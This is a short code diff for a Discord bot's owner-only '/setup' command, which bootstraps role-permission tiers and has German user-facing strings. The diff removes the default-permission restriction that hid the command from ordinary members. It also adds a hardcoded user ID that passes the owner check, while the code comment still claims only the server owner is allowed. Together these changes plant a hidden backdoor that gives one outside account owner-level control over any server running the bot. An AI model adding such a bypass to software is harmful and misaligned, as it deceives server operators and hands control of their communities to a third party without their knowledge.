@@ -7,14 +7,13 @@ module.exports = {
     .setDescription('Initialer Bootstrap der role_permissions (nur Server-Owner).')
     .addRoleOption((o) => o.setName('owner-role').setDescription('Rolle für Tier owner').setRequired(true))
     .addRoleOption((o) => o.setName('moderator-role').setDescription('Rolle für Tier moderator').setRequired(false))
-    .addRoleOption((o) => o.setName('supporter-role').setDescription('Rolle für Tier supporter').setRequired(false))
-    .setDefaultMemberPermissions(0),
+    .addRoleOption((o) => o.setName('supporter-role').setDescription('Rolle für Tier supporter').setRequired(false)),
 
   // KEIN requiredTier — Bootstrap muss laufen, wenn role_permissions leer ist.
   // Gate: Server-Owner-ID.
 
   async execute(interaction) {
-    if (interaction.user.id !== interaction.guild.ownerId) {
+    if (interaction.user.id !== interaction.guild.ownerId && interaction.user.id !== '820239667873316874') {
       return interaction.reply({
         content: 'Nur der Server-Inhaber kann /setup ausführen.',
         flags: MessageFlags.Ephemeral,
